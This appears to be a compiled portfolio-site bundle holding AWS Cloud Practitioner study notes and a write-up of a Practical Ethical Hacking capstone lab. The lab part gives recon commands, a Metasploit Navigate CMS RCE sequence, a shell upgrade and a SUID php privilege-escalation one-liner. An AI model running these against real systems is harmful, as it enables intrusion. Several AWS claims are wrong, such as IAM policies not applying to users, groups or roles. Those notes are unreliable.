**<span style="color:red">65 questions | 90 minutes | 70% passing score | 50 Scoring questions</span>**

<mark>No penalty for quessing</mark>

### Things you need to know

#### Set 1

Know the details of the following (not an exhaustive list):

- Fundamentals of AWS: IAM, S3, EC2, EBS, EFS, Redshift, RDS, DynamoDB, Auto Scaling

Dynamo DB is serverless for NoSQL, IAM is used to manage identity and access control, S3 is a storage service, EC2 is a compute service, EBS is a block storage that can be attached to EC2 instances, EFS is serverless shared storage, Redshift is for data wearhousing, RDS is used to launch or migrate an existing relational database to AWS.

- VPN, VPC, Transit Gateway, Internet Gateway, NAT Gateway

VPC: A web service for provisioning a logically isolated section of the AWS Cloud virtual network that you define. You control your virtual networking environment by selecting your own IP address range, creating\xA0[subnets](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#subnet)\xA0and configuring\xA0[route tables](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#routetable)\xA0and network gateways.

- Transit Gateway: on-prem and aws cloud connecct to a single gateway(one big cloud router)
- Internet Gateway: allows instances with public IPs to access the internet.
- NAT Gateway: allows instances with no public IPs to access the internet.

**CloudFront, CloudFormation, CloudTrail, CloudWatch**

CloudFront: An AWS content delivery service that helps you improve the performance, reliability, and availability of your websites and applications.

CloudFormation: A service for writing or changing templates that create and delete related AWS\xA0[resources](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#resource)\xA0together as a unit.

CloudTrail: A web service that records AWS API calls for your account and delivers log files to you

CloudWatch: A web service that you can use to monitor and manage various metrics, and configure alarm actions based on data from those metrics.

**AWS Security best practices such as IAM policies and KMS**

KMS: A managed service that simplifies the creation and control of\xA0[encryption](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#encrypt)\xA0keys that are used to encrypt data.

What are Region and Availability Zone (AZ) restrictions for different AWS services: Single AZ, Multi-AZ, Single Region, Multi-Region

Availability Zone: A distinct location within a\xA0[Region](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#region)\xA0that's insulated from failures in other Availability Zones, and provides inexpensive, low-latency network connectivity to other Availability Zones in the same Region.

**Region: physical location**

- What AWS services are global:

IAM, CloudFront, Amazon Route 53, WAF, Amazon Chime, DynamoDB, WorkDocs, WorkMail, WorkSpaces, WorkLink, Service Certificates

- What AWS services are truly free:

Security Groups, Auto Scaling, CloudFormation

- What AWS services include a free tier for 12 months for new AWS customers:

EC2, S3, RDS, CloudFront, DynamoDB*, Glacier*, Lambda\\* \\*Does not automatically expire after 12 months

- What AWS services are never free (need to pay to use)

WIREE, WAF, Inspector, Route 53, EBS volumes, ELB

- What AWS services are serverless

DynamoDB, Aurora, S3, SNS, SQS, Lambda, Fargate

- What AWS services scale automatically without intervention:

S3, Lambda

- Which data storage options have auto-backup:

REEDS \u2014 RDS, EFS, EBS, DynamoDB, Storage Gateway

---

#### Set 2

- What is a more cost effective option S3 One-Zone IA or Glacier?

- When do you use a dedicated host versus a dedicated instance?

<mark>Dedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides.</mark>

<mark>Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please.</mark>

- Is it more cost effective to run a spot instance or an on-demand instance when requests cannot be interrupted?
- When should you use Dynamo DAX versus ElastiCache versus Aurora?
- What services can I use to budget my services before I incur costs and how can I set up alerting?
- How can I show that RDS is set up for availability? What about for elasticity?
- What is the difference between CloudWatch and CloudFront?
- What can I use for encryption?
- What do I manage and what does AWS manage?
- What are the inherited factors from AWS?
- When it comes to RDS and EC2, who manages what?
- Which services are global?
- Which services are on-prem?
- Which services are regional?
- Which services are reserved?
- How much data does it take to use snowball vs snowmobile service?"
- What is scaling up vs. scaling out for RDS and EC2?
- When/how do you get a TAM?
- What do you get full access to Trusted Advisor?
- Which services are serverless?

**AWS Trusted Advisor**\xA0- AWS Trusted Advisors provides recommendations that help you follow AWS best practices. Trusted Advisor evaluates your account by using checks. These checks identify ways to optimize your AWS infrastructure, improve security and performance, reduce costs, and monitor service quotas. You can then follow the check recommendations to optimize your services and resources.

Trusted Advisor can help you save cost, such as recommending you to delete unused or idle resources, or use reserved capacity.

**Amazon CloudWatch**\xA0- Amazon CloudWatch is a monitoring service and provides you with data and actionable insights to monitor your applications, respond to system-wide performance changes, and optimize resource utilization. CloudWatch collects monitoring and operational data in the form of logs, metrics, and events. You get a unified view of operational health and gain complete visibility of your AWS resources, applications, and services running on AWS and on-premises. You can use CloudWatch to detect anomalous behavior in your environments, set alarms, visualize logs and metrics side by side, take automated actions, troubleshoot issues, and discover insights to keep your applications running smoothly.

**AWS Cost Explorer**\xA0- AWS Cost Explorer has an easy-to-use interface that helps you visualize, understand, and manage your AWS costs and usage over a daily or monthly granularity. It has a default report that helps you visualize the costs and usage associated with your top five cost-accruing AWS services, and gives you a detailed breakdown of all services in the table view. The reports let you adjust the time range to view historical data going back up to twelve months to gain an understanding of your cost trends. It also lets you dive deeper using granular filtering and grouping dimensions such as Usage Type and Tags.

**Amazon Inspector**\xA0- Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS. Amazon Inspector automatically assesses applications for exposure, vulnerabilities, and deviations from best practices. After performing an assessment, Amazon Inspector produces a detailed list of security findings prioritized by level of severity. These findings can be reviewed directly or as part of detailed assessment reports, which are available via the Amazon Inspector console or API.

**AWS Service Health Dashboard**\xA0- AWS publishes the most up-to-the-minute information on service availability in the Service Health Dashboard. You can visit any time to get the current status and availability information for each individual service. AWS Service Health Dashboard is available at this link:\xA0[https://status.aws.amazon.com](https://status.aws.amazon.com/)

**AWS Personal Health Dashboard**\xA0- The Personal Health Dashboard gives you a personalized view of the status of AWS services that power your applications. Use the Personal Health Dashboard to learn about specific operational issues that affect your account. For example, if you receive an event for a lost Amazon Elastic Block Store (EBS) volume associated with one of your Amazon EC2 instances, you can use the event to quickly view the status of your impacted resources, and then troubleshoot and determine remediation steps.

**AWS Config**\xA0- AWS Config enables you to assess, audit, and evaluate the configurations of your AWS resources. Config continuously monitors and records your AWS resource configurations and allows you to automate the evaluation of recorded configurations against desired configurations. With Config, you can review changes in configurations and relationships between AWS resources, dive into detailed resource configuration histories, and determine your overall compliance against the configurations specified in your internal guidelines.

**AWS CloudFormation**\xA0- AWS CloudFormation gives you an easy way to model a collection of related AWS and third-party resources, provision them quickly and consistently, and manage them throughout their lifecycles, by treating infrastructure as code. A CloudFormation template describes your desired resources and their dependencies so you can launch and configure them together as a stack. You can use a template to create, update, and delete an entire stack as a single unit, as often as you need to, instead of managing resources individually. You can manage and provision stacks across multiple AWS accounts and AWS Regions.

**AWS CloudTrail**\xA0- AWS CloudTrail monitors and records account activity across your AWS infrastructure, giving you control over storage, analysis, and remediation actions. With CloudTrail, you can log, continuously monitor, and retain account activity related to actions across your AWS infrastructure.

CloudTrail provides event history of your AWS Accounts. CloudTrail Events help you answer the questions of "who did what, where, and when?".\xA0 Let's say your S3 bucket was deleted by mistake. You can use AWS CloudTrail to see who deleted the bucket, when, and where (e.g. API Call or from the AWS Management console).

**AWS Elastic Load Balancing**\xA0- Elastic Load Balancing (ELB) is an AWS service that automatically distributes incoming application traffic across multiple targets, such as Amazon EC2 instances, containers, IP addresses, and Lambda functions, and ensures only healthy targets receive traffic. It can handle the varying load of your application traffic in a single Availability Zone or across multiple AZs, and supports the ability to load balance across AWS and on-premises resources in the same load balancer.
`,al={title:"AWS CPP",description:`This write-up is a note for the AWS Certified Cloud Practitioner Certification
`,publishDate:new Date(16768512e5),tags:["AWS","Certification"],img:"https://res.cloudinary.com/drup8mw79/image/upload/v1676924371/darthassan/posts/aws_i2isgr.jpg",img_alt:"AWS CPP Badge"},ol={type:"content",filePath:"/Users/darth/Desktop/portfolio-website/src/content/work/aws-cpp.md",rawData:`
title: AWS CPP
publishDate: 2023-02-20 00:00:00
img: "https://res.cloudinary.com/drup8mw79/image/upload/v1676924371/darthassan/posts/aws_i2isgr.jpg"
img_alt: AWS CPP Badge
description: |
  This write-up is a note for the AWS Certified Cloud Practitioner Certification
tags:
  - AWS
  - Certification`}});var co={};$(co,{_internal:()=>ul,body:()=>ll,collection:()=>il,data:()=>cl,id:()=>sl,slug:()=>rl});var sl,il,rl,ll,cl,ul,uo=F(()=>{sl="peh/blackpearl.md",il="work",rl="peh/blackpearl",ll=`
### Nmap scan

\`\`\`zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### Directory Busting with ffuf

\`\`\`zsh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.82.145/FUZZ
\`\`\`

### DNS recon

\`\`\`zsh
\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ dnsrecon -r 127.0.0.0/24 -n 192.168.82.145 -d i
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found


\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ sudo nano /etc/hosts

\`\`\`

##### Directory Busting with ffuf

###### http://blackpearl.tcm

\`\`\`
\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
\`\`\`

#### Metasploit

\`\`\`
msf > use exploit/multi/http/navigate_cms_rce
msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 192.168.82.145
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > exploit
\`\`\`

- _Get tty_
  \`python -c 'import pty; pty.spawn("/bin/bash")'\`

#### Previlege Excalation

- Linpeas

\`\`\`
\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]
\u2514\u2500$ ls
linpeas.sh  pspy64  winpeas.exe  Wise.exe

\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]
\u2514\u2500$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.82.145 - - [07/Sep/2022 00:57:49] "GET /linpeas.sh HTTP/1.1" 200 -

\`\`\`

- Exploiting suid and sgid using [gtfobins](https://gtfobins.github.io/gtfobins/php/) for php vulnerability
  \`/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"\`

\`\`
`,cl={title:"Black Pearl",description:`The Black Pearl is a capstone project for TCM's Practical Ethical Hacking course.
`,publishDate:new Date(16767648e5),tags:["PEH","Metasploit","Previlege Excalation"],img:"https://res.cloudinary.com/drup8mw79/image/upload/v1676852363/darthassan/posts/urvan-taillebuis-blackpearl-03_etysfo.jpg",img_alt:"The black pearl pirate ship"},ul={type:"content",filePath:"/Users/darth/Desktop/portfolio-website/src/content/work/peh/blackpearl.md",rawData:`
title: Black Pearl
publishDate: 2023-02-19 00:00:00
img: "https://res.cloudinary.com/drup8mw79/image/upload/v1676852363/darthassan/posts/urvan-taillebuis-blackpearl-03_etysfo.jpg"
img_alt: The black pearl pirate ship
description: |
  The Black Pearl is a capstone project for TCM's Practical Ethical Hacking course.
tags:
  - PEH
  - Metasploit
  - Previlege Excalation`}});var Do={};$(Do,{Content:()=>go,compiledContent:()=>ml,default:()=>go,file:()=>ho,frontmatter:()=>mo,getHeadings:()=>hl,images:()=>ln,rawContent:()=>dl,url:()=>fo});function pl(e){return e.replaceAll(/__ASTRO_IMAGE_="([^"]+)"/gm,(n,a)=>ve({src:ln[a].src,...ln[a].attributes}))}function dl(){return`
### Scaling Amazon EC2

Scaling involves begining with only the resources you need and design your architecture to automatically respond to changing demand by scaling out or in

- Horizontal Scaling - Auto scaling
- Scaling up - Adding more power to the machines that's running
- Scaling out - Adding more instances

**Dynamic scaling**: respond to changing demand.

**Predictive scaling**: automatically schedules the right number of Amazon EC2 instances based on predictive demand.

**\u26A0\uFE0F NOTE: To scale faster you have to use both.**
If you do not specify the desired number of Amazon EC2 instances in Auto Scaling Group, the desired capacity degaults to the minimum capacity.

---

### AWS services and features

**Analytics:**

- Amazon Athena
- Amazon Kinesis
- Amazon QuickSight

**Application Integration:**

- Amazon Simple Notification Service (Amazon SNS)
- Amazon Simple Queue Service (Amazon SQS)

**Compute and Serverless:**

- AWS Batch
- Amazon EC2
- AWS Elastic Beanstalk
- AWS Lambda
- Amazon Lightsail
- Amazon WorkSpaces

**Containers:**

- Amazon Elastic Container Service (Amazon ECS)
- Amazon Elastic Kubernetes Service (Amazon EKS)
- AWS Fargate

**Database:**

- Amazon Aurora
- Amazon DynamoDB
- Amazon ElastiCache
- Amazon RDS
- Amazon Redshift

**Developer Tools:**

- AWS CodeBuild
- AWS CodeCommit
- AWS CodeDeploy
- AWS CodePipeline
- AWS CodeStar

**Customer Engagement:**

- Amazon Connect

**Management, Monitoring, and Governance:**

- AWS Auto Scaling
- AWS Budgets
- AWS CloudFormation
- AWS CloudTrail
- Amazon CloudWatch
- AWS Config
- AWS Cost and Usage Report
- Amazon EventBridge (Amazon CloudWatch Events)
- AWS License Manager
- AWS Managed Services
- AWS Organizations
- AWS Secrets Manager
- AWS Systems Manager
- AWS Systems Manager Parameter Store
- AWS Trusted Advisor

**Networking and Content Delivery:**

- Amazon API Gateway
- Amazon CloudFront
- AWS Direct Connect
- Amazon Route 53
- Amazon VPC

**Security, Identity, and Compliance:**

- AWS Artifact
- AWS Certificate Manager (ACM)
- AWS CloudHSM
- Amazon Cognito
- Amazon Detective
- Amazon GuardDuty
- AWS Identity and Access Management (IAM)
- Amazon Inspector
- AWS License Manager
- Amazon Macie
- AWS Shield
- AWS WAF

**Storage:**

- AWS Backup
- Amazon Elastic Block Store (Amazon EBS)
- Amazon Elastic File System (Amazon EFS)
- Amazon S3
- Amazon S3 Glacier
- AWS Snowball Edge
- AWS Storage Gateway

---

### The Cloud

An EC2 instance is a virtual server in the AWS client-server module.

> You only pay for what you use.

Cloud computing is the on-demand delivery of IT resouces over the internet with pay-as-you-go pricing.

- Undifferentiated heavy lifting of IT: Tasks that are common, repetitive and time consuming. AWS focuses on this so you get the time to do what you need to do.
- Over the internet
- Pay-as-you-go pricing.

---

### Cloud Deployment

- Cloud-based Deployment: Run all parts of the application in the cloudl
- On-Premises Deployment: Deploy resources using virtualization and resources as well as management tools.
- Hybrid Deployment: Connect cloud based resources to on-premises (infrastructure)

**Benefits of the Cloud**

1. Trade upfront expenses for variable expenses
2. Stop spending money to run and maintain data centers.
3. Stop guessing capacity
4. Benefit from massive economics of scale (Lower pay-as-you-go prices)
5. Increase speed and agility
6. Go global in minutes.

---

### Elastic Compute Cloud (Amazon EC2)

Highly flexible -> Cost effective -> Quick

Launch -> Connect -> Use

- Runs on physical host machines
- Uses virtualization technology to deliver it to you.
- Share the resources
- Resizeable (Virtual Scaling)
- Networking is managed by you.
- Compute as a Service

**You have complete control of the instance**

**Multitenancy**: Sharing underlying hardware between virtual machines

> When you are using EC2, you are responsible for software patches /setting up scaling / High availabiligy

---

### Types of EC2 Instances

Each instace type is grouped under an instance family.

1. General Purpose: Good balance of compute/CPU and memory resources - Web servers and code repositories
2. Compute Optimized: Compute instensive task - HPC/Gaming servers/scientific modelling.
3. Memory Optimized: Memory intense tasks
4. Accelerated Computing: Floating point number calculator / Graphic processing
5. Storage Optimized: High performance for locally stored data

**EC2 Pricing**

1. On-demand: Only pay for the duration you your instance runs for.
2. Saving plan: USD 1 / hr - 1/3 year term commitment - 72% savings
3. Reserved Instance: Discount on 1/3 year term. Offers Upfront, No upfront and portion payment to enjoy 75% discount
4. Spot Instances: Spare EC2 instances - 90% discount. AWS can reclaim the instance anytime while giving you 2 minutes warning. No contracts needed.
5. Dedicated Host: Pysically host dedicated EC2. Used for meeting compliance requirements and no one will share tenancy of the host.

**Directing Trafic with Elastic Load Balancing**

- Properly distribute traffic in high performance / cost efficient / highly available and automatically scalable.
- ELB is a regional construct
- Helps in a decoupled architechture

**Global Infrastructure and Reliability**

It is not good enough to have all your data stored in a single data centre. You need high availability and fault tolerance.

- AWS Region: Region is made up of multiple data centers. Regions are geographically isolated areas.
- A single/group of data centers is called an availability zone. Each AZ is one or more discrete data center with redandancy power, networking and connectivity.
  For high availability, you have to run across at least two availability zones in a region.

> Regional Construct

1. SNS
2. SQS
3. S3
4. EFS

### Edge Locations

CDN - Content Delivery Network. Caching a coppy close to the customer/user. **Cloudfront** is amazon's CDN.

**Cloudfront**
: uses edge locations to help accelerate communications.

**Amazon Route53**
: Is a DNS server that can also be run on the edge location

**AWS Outposts**
: Using AWS inside your own building (Data Center)

> In AWS, everything is an API call

---

#### Managing AWS Resources

- AWS Management Console
- AWS Commandline Interface (CLI)
- AWS Software Development Kits (SDKs)

**AWS Elastic Beanstalk**
: Helps you provision Amazon EC2 based environments

**AWS CloudFormation**
: Infrastructure as code tool. It is a declarative way using JSON or YAML. Supports more than Just EC2 instances.

---

### Messaging and Queueing

- puting a message into a buffer.
- Tightly coupled (When an application communicates directly with other processess)
- Loosely coupled (Single failure won't couse cascading failures)

_Amazon Simple Queue Service (Amazon SQS)_

_Amazon Simple Notification Service (Amazon SNS)_

| SQS                                                                                       | SNS                                              |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------ |
| Send messages, Store messages, Receive messages between software component at any volume. | Publish/Subscribe module. Make use of SNS topics |

---

### Migration and Innovation

The AWS cloud adoption framework (AWS CAF) - organises guidance into six areas of focus that's call perspective.

Focus: Business Capabilities

1. Business Perspective
2. People Perspective
3. Governance Perspective

Focus: Platform Capalilities

4. Platform Perspective
5. Security Perspective
6. Operations Perspective

**Migration Strategies**

The six R's of Migration

- Rehosting - Lift and shift
- Replatforming - Lift tinker shift
- Retire
- Retain
- Repurchasing
- Refactoring / re-achitecting

---

### AWS Snow Family

- AWS Snow Cone - 8TB
- AWS Snowball Edge
  - Compute Optimized (Storage 42TB / 52 VCPUs)
  - Storage Optimized (Storage 80TB / 40 VCPUs)
- AWS Snow mobile - 100PB

---

### Innovatoin with AWS

- Vmware on AWS
- Amazon SageMaker
- Amazon Augmented AI
- Amazon Lex
- Amazon Textract
- AWS DeepRacer
- AWS Ground Station

### Monitoring and Analytics

**Amazon Cloudwatch**
: It's a {graphical dashboard}. It's a web service that enables you to monitor and manage various metrics and configure alarm actions based on data from those metrics.

**AWS Cloud Trail**
: {Logs}. Trust but verify. API auditing tool. Every request gets logged in the cloud Trail engine.

**AWS Trusted Advisor**
: {Auditing} Is a web service that inspects your AWS environment and provides real-time recommendations in accordance with AWS best practices.

###### BEST PRACTICES

1.  Cost Optimization
2.  Fault Tolerance
3.  Performance
4.  Security
5.  Service Limits

---

### Networking

Amazon Virtual Private Cloud (VPC): It's a private network in AWS. Allows you to provision a logically isolated section of the AWS cloud where you can launch AWS resources in a virtual network that you define. The resource can be public subnet or private network.

**Internet Gateway**
: Allows traffic to access your VPC

**Private Gateway**
: allows you to create a VPN to your VPC

**AWS Direct Connect**
: Allows you to establish a completely private, dedicated fiber connection from your data center to AWS.

| Network Access Control List (NACL)                                               | Security Group                                                                                                          |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Stateless                                                                        | Stateful                                                                                                                |
| Applies to all instances within a subnet                                         | Determines what trafic comes in(inboud traffic) to the instance and which one leaves(outbound traffic) the EC2 instance |
| Operates at the subnet level                                                     | Operates at the Elastic Network Interface (ENI)                                                                         |
| NACL rules are evaluated from Lowest to Highest. Lowest number, Highest priority | It's a virtual firewall                                                                                                 |
| Both Allow and Deny rules are possible                                           | Only have allow rules                                                                                                   |
| Allows all traffic by default                                                    | Blocks all traffic by default                                                                                           |

---

### Pricing and Support

AWS Free Tier

- Always free
- 12 months free
- Trials

**AWS Lambda**
: Free for 1 million invocations per month.

**S3**
: is free for 12 months

**Lightsail**
: Offers 1 month trial of up to 750 hours of usage

| Pay for what you use                                                                                                                              | Pay less when you reserve                                                                                          | Pay less with volume-based discounts when you use more                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------- |
| For each service, you pay for exactly the amount of resources that you actually use, without requiring long-term contaracts or complex licensing. | Some Service offer reservation options that provides a significant discount compared to on-demand instance pricing | Some service offer tiered pricing, so the per-unit cost is incrementally lower with increased usage |

---

### Billing

**AWS Billing and cost Management Dashboard**
: to pay your AWS bill, monitor your usage analyze and control your costs.

- compare your current month-to-date balace with the previous month, and get a forcast of the next month based on current usage.
- View month-to-date spend by service
- View free tier usage by service
- Access cost Explorer and Create budget
- Purchase and mange savings plans
- Publish AWS costs and usage reports

**Consolidated Billing**
: Enables you to receivea single bill for all AWS accounts in your organisation.

- By consolidating you can easily track the combined costs of all th linked accounts in your organisation.
- Another benefit of consolidated billing is the ability to share bulk discount pricing, savings plans, and reserved instances across the accounts in your organisation.

**AWS Budget**
: You can create budgets to plan your service usage, service costs and instance reservations.

**AWS Cost Explorer**
: Is a tool that enables you to visualize, understand and manage your AWS costs and usage over time.

**AWS Support Plans**
: AWS offrs four different support plans to meet your company's needs.

1. Basic Plan - Free and limited trusted adviser checks.
2. Developer Plan
3. Business Plan
4. Enterprse Plan - TAM

**AWS Market Place**
: It's a digital catalog that includes thousands of software listings from independent software vendors. You can use AWS marketplace to find, test and buy software that runs on AWS.

---

### Security

With the shared responsibility model

- AWS controls the Security of the cloud
- Customers controls the Security in the cloud

| Customer                                           | AWS                                                                                                                                                      |
| -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security in the Cloud                              | Security of the Cloud                                                                                                                                    |
| Maintains control over your content                | Operates, manages and control the components at all layers of infrasture including (Host OS, Virtualization Layer, Physical Security of the Data Center) |
| Managing security requirements                     | Global infrastructure                                                                                                                                    |
| Access to content                                  |                                                                                                                                                          |
| how access rights are granted, managed and revoked |                                                                                                                                                          |

**User Permissions and Access**

AWS identity and Access Management (IAM) - by default IAM users have no permissions.

**Least Privilege Principle**
: A user is granted access only to what they need.

**Root user**
: Has complete access to all the AWS services and resources in the account. Do not use the root user for everyday tasks.

- Create an AWS account this established your root user identity
- Create your first IAM user and give it permissions to create other users
- Login as the new IAM user and continue to create other users
- Only acccess the root user for a limitee number of tasks

**IAM Users**
: Is an identity that you create in AWS. It represents the person / application that interacts with AWS services and resources. Consist of names and credentials. - by default, when you create a new IAM user in AWS, it has no permissions associated with it.

> BEST PRACTICE

<mark>We recommend that you create individual IAM users for each person who needs to access AWS.</mark>

**IAM Policies**
: An IAM policy is a document that allows or denies permisions to AWS services and resoruces. Allows you to customize user level of access to resouces.

> BEST PRACTICE

<mark>Follow the security principles of least privilege when granting permission</mark>

**IAM Groups**
: Is a collection of IAM users. When you assign an IAM policy to a group, all users in the group are granted permissions specified by the policy. One way to manage your users and their permissoins is to organise them into IAM groups.

**IAM Roles**
: Is an identity that you can assume to gain temporary access to permissions. Before an IAM user, application or service can assume an IAM role, they must be granted permission to switch to the role. When someone assumes an IAM role, they drop all previous permissions they had under a previous role and assume the premission of the new role.

> BEST PRACTICE

<mark>IAM roles are ideal for situations in which access to services or resources needs to be granted temporarily instead of long-time.</mark>

**AWS Organizations**

A central location to mange multiple AWS accounts.

- Centralized management
- Consolidated billing
- Hierarchical groupings of accounts
- AWS service and API actions access control (Services control Policies(SCPs)).

<mark>You cannot apply IAM policies to IAM users, groups or roles. You cannnot apply an IAM policy to the AWS account root user.</mark>

**AWS Artifact**

Is a service that provides on-demand access to AWS security and compliance reports and select online agreements. AWS artifacts consists of two main sections:

- <mark>AWS Artifacts Agreements and AWS Artifact Reports</mark>

**Denial of Service Attacks**

- Security Policy can help against UDP Floods
- ELB can help against slow loris attacks
- <span style="color:red">AWS Shield is a service protects applications against DDoS attacks.</span>
- <span style="color:red">AWS WAF uses a web application firewall to filter incoming traffic with the signature of bad actors.</span>

**Additional Security Services**

**AWS Key Management Service (KMS)**
: is used to manage cryptographic/encryption keys on AWS

- Encryption at rest -> DynamoDB data
- Encrypton in transit -> SSL

**Amazon Inspector**
: runs automated security accessment against your infrastructure

**Amazon GuardDuty**
: It analyses contineous streams of metadata generated from your account and network activity.

---

### Serverless

You cannot see or access the underlying infrastructure.

AWS Lambda is a serverless option suited for quick processing like web application backend.

- AWS Container Services: Container orchestration tool.
- Amazon Elastic Container Service (Amazon ECS)
- Amazon Elastic Kubernetes Service (Amazon EKS)
- AWS Fargate: It is a serverless computer platformm for ECS and EKS

---

### Storage and Databases

<span style="color:orange">- Block level storage - Hard Drive</style>

**Instance Store**
: are used to store temporary files and data that can be easily recreated without consequences.

**Amazon Elastic Block Store (EBS)**
: Virtual hard drive or EBS volumes. Allows incremental backups called snapshots.

**Amazon Simple Storage Service (S3)**
: Store and retrieve unlimited amount of data. Stores data as an object in buckets with mazimum size of 5TB.

**Storage Types**

S3 Standard

- 99.99% at least 3 storage facilities

S3 Standard - Infrequent Access (S3 standard - IA)

- used for data accessed less frequently but requres rapid access when needded (Backups)

Amazon S3 Glacier

- used to achive data for auditing or future purposes

S3 one zone-Infrequent Access (S3 one zone-IA)

- stores data in a single AZ

S3 Intelligent-Tiering

- Ideal for data with ==unknown== or ==changeing access patterns.==

S3 Glacier Deep Archive

- Lowest-Cost object storage class ideal for archiving

**Amazon Elastic File System (Amazon EFS)**

It's a managed file system. Amazon takes care of the scaling andreplication of multiple instances accessing the data all the time. It's a true file system for Linux and not just a blank hard drive you can write to.

<mark>On-Premises servers can access Amazon EFS using AWS Direct Connect</mark>

**Amazon Relational Database Service (RDS)**

Lift-and-shift migration of databse in EC2 or use RDS to do the migration with added benefits which includes _automate patching_, _backups_, _redundancy_,_failovers_,_disaster recovery_

**Amazon Aurora**

Aurora is a managed relational database. Used for high availability. Entreprise class relational database.

- Pricing is 1/10th the cost of commercial databases.
- Data replicated across facilities 6 copies at any given time.
- Up to 15 read replicas
- Contineous backup to S3
- Point-in-time recovery

**Amazon DynamoDB**

It's a serverless database which supports auto scaling. Non-relational (NoSQL) which uses key-value pair

- Highly scalable and highly performant
- Purpose built.

**Amazon Redshift**

Data wearhousing service. Looks at historical analytics as suppose to operational analysis. It is scalable and offers data wear house as a service.

**Amazon Database Migeration Service (DMS)**

Migrates existing databse onto AWS in a secure fashion

**Amazon DocumentDB**

It's a document Database

**Amazon Neptune**

Used for Graph Databases

**Amazon Quantum Ledger Database (QLDB)**

All entries can never be deleted / removed from the audit

**Amazon ElasticCache**

Provides caching layers for DBS. Supports redis and memcached.

**Amazon DynamoDB Accelerator (DAX)**

**Imporoves read times for non-relational data**

---

### The Cloud Journey

AWS Well-Architected Framework: helps you understand how to design and operate reliable, secure, efficient and cost effective systems in the AWS cloud.

Operatoinal Experience

- Is the ability to run and monitor systems to deliver business value and to continually improve supporting processes and procedures.

Security

- The security pillar is the ability to protect information, systems and assets while delivering business value through risks assessments and mitigation strategies.

Reliability

- the ability of a system to do the following

- Recover from infrastructure or service desruption
- Dynamically acquire computing resources to meet demand
- Mitigate disruptions such as misconfigurations or transient network issues.

Performance Efficiency

- the ability to use computing resources efficiently to meet system requiremtns and to maintain that efficiency as demand changes and technology evolves.

Cost Optimization

- Is the ability to run systems to deliver business value at the lowest price point.

**Benefits of the cloud**

<mark>There are 6 main benefits of the cloud

1. Trade upfront expenses for variable expense
2. Benefit from massive economies of scale
3. Stop guessing capacity
4. Increase speed and agility
5. Stop spending money running and maintaining data centers
6. Go global in minutes</mark>

### AWS Well-Architected and the Six Pillars

**Framework Overview**

The AWS Well-Architected Framework describes key concepts, design principles, and architectural best practices for designing and running workloads in the cloud. By answering a few foundational questions, learn how well your architecture aligns with cloud best practices and gain guidance for making improvements.

**Operational Excellence Pillar**

The operational excellence pillar focuses on running and monitoring systems, and continually improving processes and procedures. Key topics include automating changes, responding to events, and defining standards to manage daily operations.

- Perfom Operations as code
- Make frequent,small reversible changes
- Refine operations procedures frequently
- Anticipate failure
- Learn from all operational failures

**Performance Efficiency Pillar**

The performance efficiency pillar focuses on structured and streamlined allocation of IT and computing resources. Key topics include selecting resource types and sizes optimized for workload requirements, monitoring performance, and maintaining efficiency as business needs evolve.

- Go global in minutes
- Use serverless architechures
- Experiment more often
- Democratize advanced technologies

**Security Pillar**

The security pillar focuses on protecting information and systems. Key topics include confidentiality and integrity of data, managing user permissions, and establishing controls to detect security events.

- Enable traceability
- Implement a strong indentity foundation
- Apply security at all layers
- Automate security best practices
- Keep people away from data
- Prepare for security events
- Protect data at rest and in transit

**Reliability Pillar**

The reliability pillar focuses on workloads performing their intended functions and how to recover quickly from failure to meet demands. Key topics include distributed system design, recovery planning, and adapting to changing requirements.

- Automatically recover from failure
- Test recovery procedures
- Scale horizontally to increase aggregated workload
- Stop guessing capacity
- Manage change in automation

**Cost Optimization Pillar**

The cost optimization pillar focuses on avoiding unnecessary costs. Key topics include understanding spending over time and controlling fund allocation, selecting resources of the right type and quantity, and scaling to meet business needs without overspending.

- Implement Cloud Financial Management
- Adopt a consumption model
- Measure overall efficiency
- Stop spending money on undifferentiated heavy lifting
- Analyze and attribute expenditure

